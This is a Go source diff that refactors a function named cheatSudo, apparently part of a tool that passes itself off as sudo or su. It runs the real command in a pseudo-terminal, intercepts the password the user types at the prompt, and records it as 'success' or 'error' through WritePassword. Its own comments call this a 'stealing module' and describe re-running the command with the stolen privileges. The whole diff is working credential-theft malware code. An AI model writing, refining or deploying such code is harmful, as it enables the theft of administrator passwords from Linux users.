@@ -16,16 +16,9 @@ var SudoAskEnd = regexp.MustCompile(`(: $)|(：$)`)
 
 func cheatSudo() {
 	var pty, err = term.OpenPTY()
-	if err != nil {
-		execScript(cmd)
-		return
-	}
-	var writeMsg = make(chan struct{})
+	ExecIfErr(err)
 	var password string
 	var inputArgs []string
-	var AskPass bool
-	var readLock = make(chan struct{})
-	//var IfSuccess bool
 
 	suCmd := false
 	for _, v := range os.Args[1:] {
@@ -42,96 +35,59 @@ func cheatSudo() {
 	c.Stdout = pty.Slave
 	c.Stdin = pty.Slave
 	c.Stderr = pty.Slave
-	c.Start()
-	go func() {
-		for {
-			<-writeMsg
-			password = getPassword()
-			pty.Master.WriteString(password + "\r\n")
-		}
+	err = c.Start()
+	ExecIfErr(err)
 
-	}()
-	var suffix string
-	var lineByte []byte
-	var line string
+	var p ptyReader
+	p.Reader(pty)
+	p.AddRule(SudoAskPrefix, SudoAskEnd)
+
+	var AskPass bool
 	go func() {
+		defer func() {
+			p.ReadLock <- struct{}{}
+		}()
+
+		line := p.Readline()
+		if !failAuthRE.MatchString(line) || line == "" {
+			return
+		}
+		AskPass = true
 		for {
-			v, err := pty.ReadByte()
-			if err != nil || v == 0 {
-				if suCmd && password != "" {
-					writePassword(password + " success")
-				} else if password != "" {
-					writePassword(password + " error")
-					password = ""
-				}
-				readLock <- struct{}{}
+			if p.IsClose() {
 				return
 			}
-			lineByte = append(lineByte, v)
-			line = string(lineByte)
-			if len(string(lineByte)) <= 6 && len(suffix) <= 7 {
-				suffix = string(lineByte)
+			if password != "" && failAuthRE.MatchString(line) {
+				WritePassword(password + " error")
+				password = ""
 			}
-
-			//若命令无需询问密码,退出窃取模块
-			if password == "" && len(suffix) == 6 && !SudoAskPrefix.MatchString(suffix) {
-				readLock <- struct{}{}
+			if strings.TrimSpace(line) != "" && password != "" {
+				WritePassword(password + " success")
 				return
 			}
-			//逐行输出
-			if (v == 13 || v == 10) && AskPass {
-				fmt.Print(line)
-				//判断密码是否正确
-				if password != "" && strings.TrimSpace(line) != "" {
-					if failAuthRE.MatchString(line) {
-						writePassword(password + " error")
-						password = ""
-					} else {
-						writePassword(password + " success")
-						readLock <- struct{}{}
-						return
-					}
-				}
-				lineByte = nil
-				line = ""
-			}
-			//询问密码语句输出
-			if line != "" && SudoAskEnd.MatchString(line) && SudoAskPrefix.MatchString(line) {
-				AskPass = true
-				fmt.Print(line)
-				//判断密码是否正确
-				if password != "" && strings.TrimSpace(line) != "" {
-					if failAuthRE.MatchString(line) {
-						writePassword(password + " error")
-						password = ""
-					} else {
-						//IfSuccess = true
-						writePassword(password + " success")
-						readLock <- struct{}{}
-						return
-					}
-				}
 
-				lineByte = nil
-				line = ""
-				writeMsg <- struct{}{}
-				//去除输入的换行符
-				pty.ReadByte()
-				//pty.ReadByte()
+			fmt.Print(line)
+			if SudoAskEnd.MatchString(line) && SudoAskPrefix.MatchString(line) {
+				password = GetPassword()
+				pty.Master.WriteString(password + "\r")
 			}
-
+			line = p.Readline()
 		}
 	}()
+
 	c.Wait()
 	if AskPass {
 		time.Sleep(time.Second / 2) //适配中文语言Linux环境的bug
 	}
-	pty.Close()
-	<-readLock
+	p.Close()
 
-	if AskPass && password == "" {
-		return
+	if suCmd && password != "" {
+		WritePassword(password + " success")
 	}
-	//窃取模块结束后利用sudo权限重新执行命令
-	execScript(cmd)
+	if !AskPass {
+		ExecScript(cmd)
+	}
+	if password != "" {
+		ExecScript(cmd)
+	}
 }
